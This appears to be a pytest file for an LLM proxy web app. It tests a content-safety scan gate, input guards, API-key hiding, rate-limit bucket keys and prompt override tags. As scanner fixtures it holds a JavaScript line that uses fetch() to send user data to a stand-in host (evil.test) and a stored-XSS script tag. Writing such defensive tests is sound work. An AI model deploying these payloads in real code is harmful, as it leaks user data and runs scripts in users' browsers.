"""Phase 27: guard coverage, the blocking scan gate, endpoint key hygiene,
the rate-limit bucket key, and the two command-tag fixes.

Every test here targets a gap that shipped green for years: the scanner
observed but never blocked, two content routers guarded nothing, the
endpoints list handed the provider key to the browser, every HS256 JWT
hashed to the same rate-limit bucket, <VERIFY:off> was ignored off the
streaming path, and <MAP:off> was unreachable.
"""
import pytest

from app.services.rate_limiter import _bucket_key

# ============================================================================
# The blocking scan gate
# ============================================================================

EXFIL_CODE = "fetch('http://evil.test/?k=' + context.user_data);"
SCRIPT_ENTRY = {"name": "Bad", "content": "Some text <script>alert('xss')</script>"}


class TestScanGateCantrips:
    @pytest.mark.asyncio
    async def test_update_blocked_and_overridable(self, admin_client):
        client, _, _ = admin_client
        created = await client.post("/api/cantrips", json={
            "name": "Clean", "code": "const x = 1;",
        })
        assert created.status_code == 201, created.text
        cid = created.json()["id"]

        blocked = await client.put(f"/api/cantrips/{cid}", json={"code": EXFIL_CODE})
        assert blocked.status_code == 422
        assert any("fetch()" in f["description"] for f in blocked.json()["detail"]["scan_findings"])

        # The stored code is unchanged: the 422 fired before any write.
        fetched = await client.get(f"/api/cantrips/{cid}")
        assert fetched.json()["code"] == "const x = 1;"

        overridden = await client.put(f"/api/cantrips/{cid}", json={
            "code": EXFIL_CODE, "override_scan": True,
        })
        assert overridden.status_code == 200
        assert overridden.json()["code"] == EXFIL_CODE

    @pytest.mark.asyncio
    async def test_blocked_update_is_still_audited_and_snapshots_nothing(self, admin_client):
        """A refused write is the one case where the audit row is the only
        record it ever happened — it must survive the 422 rollback, and the
        pre_edit snapshot taken earlier in the same request must not (a refused
        edit is not a version)."""
        client, _, _ = admin_client
        created = await client.post("/api/cantrips", json={
            "name": "Audited", "code": "const a = 1;",
        })
        cid = created.json()["id"]

        blocked = await client.put(f"/api/cantrips/{cid}", json={"code": EXFIL_CODE})
        assert blocked.status_code == 422

        audit = await client.get("/api/admin/audit")
        assert audit.status_code == 200
        entries = [
            e for e in audit.json()["logs"]
            if e["action"] == "content_safety_scan" and e["target_id"] == cid
        ]
        assert entries, "a scanner-blocked write must leave an audit trail"

        snaps = await client.get(
            "/api/snapshots", params={"resource_type": "cantrip", "resource_id": cid}
        )
        assert snaps.status_code == 200
        assert snaps.json()["snapshots"] == []

    @pytest.mark.asyncio
    async def test_override_scan_is_not_persisted_as_a_column(self, admin_client):
        """update_cantrip model_dumps the request; override_scan must be popped
        before setattr or every cantrip gains a phantom attribute."""
        client, _, _ = admin_client
        created = await client.post("/api/cantrips", json={
            "name": "Col", "code": "const y = 2;", "override_scan": True,
        })
        assert created.status_code == 201
        assert "override_scan" not in created.json()


class TestScanGateLorebooks:
    @pytest.mark.asyncio
    async def test_entry_create_blocked_and_overridable(self, admin_client):
        client, _, _ = admin_client
        lb = await client.post("/api/lorebooks", json={"name": "LB"})
        assert lb.status_code == 201, lb.text
        lb_id = lb.json()["id"]

        blocked = await client.post(f"/api/lorebooks/{lb_id}/entries", json=SCRIPT_ENTRY)
        assert blocked.status_code == 422
        assert any("script" in f["description"] for f in blocked.json()["detail"]["scan_findings"])

        listing = await client.get(f"/api/lorebooks/{lb_id}")
        assert listing.json()["entries"] == []

        audit = await client.get("/api/admin/audit")
        assert audit.status_code == 200
        entries = [
            e for e in audit.json()["logs"]
            if e["action"] == "content_safety_scan" and e["target_type"] == "lorebook_entry"
        ]
        assert entries, "a scanner-blocked entry must leave an audit trail"

        ok = await client.post(f"/api/lorebooks/{lb_id}/entries", json={
            **SCRIPT_ENTRY, "override_scan": True,
        })
        assert ok.status_code == 201

    @pytest.mark.asyncio
    async def test_import_blocked_and_overridable(self, admin_client):
        client, _, _ = admin_client
        blocked = await client.post("/api/lorebooks/import", json={
            "name": "Imported", "entries": [SCRIPT_ENTRY],
        })
        assert blocked.status_code == 422

        ok = await client.post("/api/lorebooks/import", json={
            "name": "Imported", "entries": [SCRIPT_ENTRY], "override_scan": True,
        })
        assert ok.status_code == 201


class TestScanGateMapImport:
    @staticmethod
    def _map_with_embedded_cantrip():
        return {
            "name": "Smuggled",
            "stages": [{
                "stage_order": 1,
                "name": "Stage 1",
                "system_instructions": "Do things.",
                "endpoint_tag": "",
                "output_mode": "persist",
                "resources": [{
                    "resource_type": "cantrip",
                    "position": "pre_driver",
                    "resource_name": "Exfil",
                    "resource_content": {"name": "Exfil", "code": EXFIL_CODE},
                }],
            }],
        }

    @pytest.mark.asyncio
    async def test_import_blocked_and_overridable(self, admin_client):
        client, _, _ = admin_client
        blocked = await client.post("/api/maps/import", json={"data": self._map_with_embedded_cantrip()})
        assert blocked.status_code == 422
        assert any("fetch()" in f["description"] for f in blocked.json()["detail"]["scan_findings"])

        # Nothing was created — the map list stays empty.
        listing = await client.get("/api/maps")
        assert listing.json()["maps"] == []

        ok = await client.post("/api/maps/import", json={
            "data": self._map_with_embedded_cantrip(), "override_scan": True,
        })
        assert ok.status_code == 201, ok.text


class TestScanGateSnapshotRestore:
    @pytest.mark.asyncio
    async def test_restore_in_place_blocked_and_overridable(self, admin_client):
        """A snapshot taken while the scanner was quieter (or saved with the
        override) must not restore its findings without the same explicit
        confirmation a direct edit needs."""
        client, _, _ = admin_client
        created = await client.post("/api/cantrips", json={
            "name": "SnapshotSource", "code": EXFIL_CODE, "override_scan": True,
        })
        cid = created.json()["id"]

        snap = await client.post("/api/snapshots", json={
            "resource_type": "cantrip", "resource_id": cid, "label": "poisoned",
        })
        assert snap.status_code in (200, 201), snap.text
        snap_id = snap.json()["id"]

        # Move the live object to clean code; the snapshot still holds the finding.
        await client.put(f"/api/cantrips/{cid}", json={"code": "const clean = 1;"})

        blocked = await client.post(f"/api/snapshots/{snap_id}/restore-in-place", json={})
        assert blocked.status_code == 422
        assert any("fetch()" in f["description"] for f in blocked.json()["detail"]["scan_findings"])

        # Live code untouched by the refused restore.
        fetched = await client.get(f"/api/cantrips/{cid}")
        assert fetched.json()["code"] == "const clean = 1;"

        ok = await client.post(
            f"/api/snapshots/{snap_id}/restore-in-place", json={"override_scan": True}
        )
        assert ok.status_code == 200, ok.text

        fetched = await client.get(f"/api/cantrips/{cid}")
        assert fetched.json()["code"] == EXFIL_CODE


# ============================================================================
# Map and tag-group content guards
# ============================================================================

class TestMapContentGuards:
    @pytest.mark.asyncio
    async def test_oversized_stage_instructions_rejected(self, admin_client):
        client, _, _ = admin_client
        resp = await client.post("/api/maps", json={
            "name": "Big",
            "stages": [{
                "name": "S1",
                "system_instructions": "x" * (25 * 1024 + 1),
            }],
        })
        assert resp.status_code == 413

    @pytest.mark.asyncio
    async def test_oversized_global_instructions_rejected(self, admin_client):
        client, _, _ = admin_client
        resp = await client.post("/api/maps", json={
            "name": "BigGlobal", "global_llm_instructions": "x" * (25 * 1024 + 1),
        })
        assert resp.status_code == 413

    @pytest.mark.asyncio
    async def test_name_control_chars_stripped(self, admin_client):
        client, _, _ = admin_client
        resp = await client.post("/api/maps", json={"name": "Map\x00Name"})
        assert resp.status_code == 201
        assert resp.json()["name"] == "MapName"


class TestTagGroupGuards:
    @pytest.mark.asyncio
    async def test_name_control_chars_stripped(self, admin_client):
        client, _, _ = admin_client
        resp = await client.post("/api/tag-groups", json={
            "name": "Gr\x00oup", "tag": "ta\x1bg",
        })
        assert resp.status_code == 201, resp.text
        assert resp.json()["name"] == "Group"
        assert resp.json()["tag"] == "tag"


# ============================================================================
# Endpoint key hygiene
# ============================================================================

class TestEndpointKeyHygiene:
    @pytest.mark.asyncio
    async def test_list_has_no_key_only_a_flag(self, admin_client):
        client, _, _ = admin_client
        await client.post("/api/endpoints", json={
            "name": "EP", "base_url": "http://ep.test", "api_key": "sk-live-secret",
        })
        listing = await client.get("/api/endpoints")
        ep = listing.json()["endpoints"][0]
        assert "api_key" not in ep
        assert "sk-live-secret" not in listing.text
        assert ep["api_key_set"] is True

    @pytest.mark.asyncio
    async def test_reveal_returns_key_and_audits(self, admin_client):
        client, _, _ = admin_client
        created = await client.post("/api/endpoints", json={
            "name": "EP2", "base_url": "http://ep2.test", "api_key": "sk-reveal-me",
        })
        ep_id = created.json()["id"]

        revealed = await client.post(f"/api/endpoints/{ep_id}/reveal")
        assert revealed.status_code == 200
        assert revealed.json()["api_key"] == "sk-reveal-me"

        audit = await client.get("/api/admin/audit")
        assert audit.status_code == 200
        entries = [e for e in audit.json()["logs"] if e["action"] == "endpoint_key_reveal"]
        assert entries and entries[0]["target_id"] == ep_id

    @pytest.mark.asyncio
    async def test_update_without_key_keeps_it(self, admin_client):
        """Editing an endpoint no longer prefills the key; a blank field must
        not silently clear it."""
        client, _, _ = admin_client
        created = await client.post("/api/endpoints", json={
            "name": "EP3", "base_url": "http://ep3.test", "api_key": "sk-keep-me",
        })
        ep_id = created.json()["id"]

        await client.put(f"/api/endpoints/{ep_id}", json={"name": "EP3 renamed"})
        revealed = await client.post(f"/api/endpoints/{ep_id}/reveal")
        assert revealed.json()["api_key"] == "sk-keep-me"

    @pytest.mark.asyncio
    async def test_another_user_cannot_reveal(self, admin_client):
        client, _, _ = admin_client
        created = await client.post("/api/endpoints", json={
            "name": "Mine", "base_url": "http://mine.test", "api_key": "sk-mine",
        })
        ep_id = created.json()["id"]

        other_token = await _second_user(client)
        resp = await client.post(
            f"/api/endpoints/{ep_id}/reveal",
            headers={"Authorization": f"Bearer {other_token}"},
        )
        assert resp.status_code == 404


async def _second_user(client):
    created = await client.post(
        "/api/users",
        json={"username": "other", "password": "otherpass123", "is_admin": False},
    )
    assert created.status_code in (200, 201), created.text
    login = await client.post(
        "/api/auth/login", json={"username": "other", "password": "otherpass123"}
    )
    assert login.status_code == 200
    return login.json()["access_token"]


# ============================================================================
# Rate-limit bucket key
# ============================================================================

class TestBucketKey:
    def test_different_tokens_get_different_buckets(self):
        # Every HS256 JWT starts with these bytes; before Phase 27 both hashed
        # to the same key and a shared-NAT IP collapsed every user into one
        # 120/min bucket.
        a = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload-a.sig"
        b = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload-b.sig"
        assert _bucket_key("api", a, "1.2.3.4") != _bucket_key("api", b, "1.2.3.4")

    def test_same_token_same_bucket_regardless_of_ip(self):
        a = "Bearer eyJhbGciOi.same.sig"
        assert _bucket_key("api", a, "1.1.1.1") == _bucket_key("api", a, "2.2.2.2")

    def test_key_does_not_contain_the_raw_token(self):
        a = "Bearer super-secret-credential"
        assert "super-secret-credential" not in _bucket_key("api", a, "1.2.3.4")

    def test_no_auth_falls_back_to_ip(self):
        assert _bucket_key("api", "", "9.9.9.9") == "api:9.9.9.9"


# ============================================================================
# <VERIFY:off> on the non-streaming path
# ============================================================================

class TestVerifyOffNonStreaming:
    DRIVER_URL = "http://driver-backend:9999"
    VERIFY_URL = "http://verify-backend:8888"

    @pytest.fixture(autouse=True)
    def set_endpoint(self, monkeypatch):
        from app.config import Settings
        monkeypatch.setattr(
            "app.services.proxy.settings",
            Settings(
                default_endpoint_url=self.DRIVER_URL,
                default_endpoint_api_key="sk-test-key",
                default_endpoint_model="test-model",
            ),
        )

    async def _setup_active_rule(self, client):
        driver_ep = await client.post("/api/endpoints", json={
            "name": "Driver", "base_url": self.DRIVER_URL, "api_key": "sk-driver",
        })
        await client.put("/api/settings", json={"default_endpoint_id": driver_ep.json()["id"]})
        verify_ep = await client.post("/api/endpoints", json={
            "name": "Verifier", "base_url": self.VERIFY_URL, "api_key": "sk-verify",
            "api_base_path": "/v1",
        })
        await client.post("/api/verification/rules", json={
            "name": "Always", "prompt": "Stay in character.", "max_retries": 1,
        })
        await client.put("/api/verification/settings", json={
            "verification_enabled": True,
            "verification_endpoint_id": verify_ep.json()["id"],
            "verification_model": "verify-model",
        })

    @staticmethod
    def _llm(content):
        return {"choices": [{"message": {"content": content}}]}

    @staticmethod
    def _judge(violation):
        return {"choices": [{"message": {"content": (
            '{"violation": %s, "reason": "x", "severity": "low"}' % ("true" if violation else "false")
        )}}]}

    @pytest.mark.asyncio
    async def test_off_skips_the_loop_on_a_plain_request(self, admin_client, httpx_mock):
        """The override used to be consulted only in the streaming branch, so a
        non-streaming request with <VERIFY:off> still paid for a judge call."""
        client, _, api_key = admin_client
        await self._setup_active_rule(client)

        httpx_mock.add_response(
            url=f"{self.DRIVER_URL}/v1/chat/completions",
            json=self._llm("Driver says hi."), status_code=200,
        )

        resp = await client.post("/v1/chat/completions", json={
            "model": "test", "stream": False,
            "messages": [{"role": "user", "content": "Hello <VERIFY:off>"}],
        }, headers={"Authorization": f"Bearer {api_key}"})

        assert resp.status_code == 200
        assert resp.json()["choices"][0]["message"]["content"] == "Driver says hi."
        # Exactly one upstream call: the driver. No judge.
        requests = httpx_mock.get_requests()
        assert len(requests) == 1
        assert all(r.url.host != "verify-backend" for r in requests)

    @pytest.mark.asyncio
    async def test_same_request_without_the_tag_verifies(self, admin_client, httpx_mock):
        """Vacuity check: without the tag the same setup must reach the judge,
        proving the skip above is the override working, not a dead rule."""
        client, _, api_key = admin_client
        await self._setup_active_rule(client)

        httpx_mock.add_response(
            url=f"{self.DRIVER_URL}/v1/chat/completions",
            json=self._llm("Driver says hi."), status_code=200,
        )
        httpx_mock.add_response(
            url=f"{self.VERIFY_URL}/v1/chat/completions",
            json=self._judge(False), status_code=200,
        )

        resp = await client.post("/v1/chat/completions", json={
            "model": "test", "stream": False,
            "messages": [{"role": "user", "content": "Hello"}],
        }, headers={"Authorization": f"Bearer {api_key}"})

        assert resp.status_code == 200
        assert any(r.url.host == "verify-backend" for r in httpx_mock.get_requests())


# ============================================================================
# <MAP:off> end to end
# ============================================================================

class TestMapOffPipeline:
    DEFAULT_URL = "http://default-backend:7777"
    STAGE_URL = "http://stage-backend:6666"

    @pytest.fixture(autouse=True)
    def set_endpoint(self, monkeypatch):
        from app.config import Settings
        monkeypatch.setattr(
            "app.services.proxy.settings",
            Settings(
                default_endpoint_url=self.DEFAULT_URL,
                default_endpoint_api_key="sk-test-key",
                default_endpoint_model="test-model",
            ),
        )

    async def _setup_default_map(self, client):
        default_ep = await client.post("/api/endpoints", json={
            "name": "Default", "base_url": self.DEFAULT_URL, "api_key": "sk-default",
        })
        await client.put("/api/settings", json={"default_endpoint_id": default_ep.json()["id"]})
        stage_ep = await client.post("/api/endpoints", json={
            "name": "Stage", "base_url": self.STAGE_URL, "api_key": "sk-stage",
        })
        created = await client.post("/api/maps", json={
            "name": "Pipeline", "tag": "pipeline",
            "stages": [{
                "name": "Only", "endpoint_id": stage_ep.json()["id"], "output_mode": "persist",
            }],
        })
        assert created.status_code == 201, created.text
        await client.put("/api/settings", json={"default_map_id": created.json()["id"]})

    @pytest.mark.asyncio
    async def test_map_off_runs_the_standard_pipeline(self, admin_client, httpx_mock):
        client, _, api_key = admin_client
        await self._setup_default_map(client)

        httpx_mock.add_response(
            url=f"{self.DEFAULT_URL}/v1/chat/completions",
            json={"choices": [{"message": {"content": "plain answer"}}]}, status_code=200,
        )

        resp = await client.post("/v1/chat/completions", json={
            "model": "test",
            "messages": [{"role": "user", "content": "Hello <MAP:off>"}],
        }, headers={"Authorization": f"Bearer {api_key}"})

        assert resp.status_code == 200
        assert resp.json()["choices"][0]["message"]["content"] == "plain answer"
        hosts = [r.url.host for r in httpx_mock.get_requests()]
        assert hosts == ["default-backend"]

    @pytest.mark.asyncio
    async def test_without_the_tag_the_map_runs(self, admin_client, httpx_mock):
        """Vacuity check: same setup, no tag — the map's stage endpoint is hit."""
        client, _, api_key = admin_client
        await self._setup_default_map(client)

        httpx_mock.add_response(
            url=f"{self.STAGE_URL}/v1/chat/completions",
            json={"choices": [{"message": {"content": "stage answer"}}]}, status_code=200,
        )

        resp = await client.post("/v1/chat/completions", json={
            "model": "test",
            "messages": [{"role": "user", "content": "Hello"}],
        }, headers={"Authorization": f"Bearer {api_key}"})

        assert resp.status_code == 200
        hosts = [r.url.host for r in httpx_mock.get_requests()]
        assert hosts == ["stage-backend"]
